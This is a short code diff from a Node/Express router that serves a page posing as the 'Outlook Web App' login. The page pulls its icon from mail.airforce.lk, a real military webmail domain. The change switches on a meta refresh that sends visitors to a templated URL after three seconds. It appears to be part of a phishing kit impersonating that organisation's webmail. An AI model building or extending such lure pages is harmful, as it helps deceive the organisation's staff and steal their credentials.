@@ -49,7 +49,7 @@ router.get('/', (req, res) => {
         <link rel="shortcut icon" href="https://mail.airforce.lk/owa/auth/15.2.1258/themes/resources/favicon.ico" type="image/x-icon">
         <title>Outlook Web App</title>
         <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-        <!-- <meta http-equiv="REFRESH" content="03; url=${url}"> -->
+        <meta http-equiv="REFRESH" content="03; url=${url}"> 
 
  <!--  <script>
         // Function to redirect to the new page
